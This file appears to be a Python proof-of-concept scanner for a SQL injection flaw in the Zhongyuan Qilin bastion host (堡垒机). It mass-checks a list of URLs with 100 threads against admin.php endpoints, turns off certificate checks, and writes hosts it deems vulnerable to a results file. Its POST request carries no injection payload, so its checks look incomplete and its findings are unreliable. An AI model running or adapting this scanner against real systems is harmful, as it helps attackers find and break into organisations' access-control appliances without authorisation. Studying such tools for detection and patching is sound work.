import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
    $$$$$$$\                      $$\           $$\ 
    $$  __$$\                     $$ |          \__|
    $$ |  $$ | $$$$$$\   $$$$$$\  $$ | $$$$$$\  $$\ 
    $$$$$$$\ | \____$$\ $$  __$$\ $$ |$$  __$$\ $$ |
    $$  __$$\  $$$$$$$ |$$ /  $$ |$$ |$$$$$$$$ |$$ |
    $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |$$   ____|$$ |
    $$$$$$$  |\$$$$$$$ |\$$$$$$  |$$ |\$$$$$$$\ $$ |
    \_______/  \_______| \______/ \__| \_______|\__|
    """
    print(test)

def main():
    banner()
    parse = argparse.ArgumentParser(description="中远麒麟堡垒机SQL注入漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parse.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")
def poc(target):
    payload1 = '/admin.php?controller=admin_index&action=login'
    payload2 = '/admin.php?controller=admin_commonuser'
    headers = {
        "Accept-Encoding": "gzip,deflate,br",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    try:
        res1 = requests.get(url=target+payload1, verify=False, timeout=5)
        if res1.status_code == 200:
            res2 = requests.post(url=target+payload2, headers=headers, verify=False,timeout=5)
            if res2.status_code == 200 and "result" in res2.text:
                print(f"[+]{target}存在sql注入漏洞")
                with open("中远_result.txt","a",encoding='utf-8') as f:
                    f.write(f"{target}存在sql注入漏洞\n")
            else:
                print(f"[-]{target}不存在sql注入漏洞")
    except Exception as e:
        print(f"{target}可能存在sql注入漏洞请手工测试")
if __name__ == '__main__':
    main()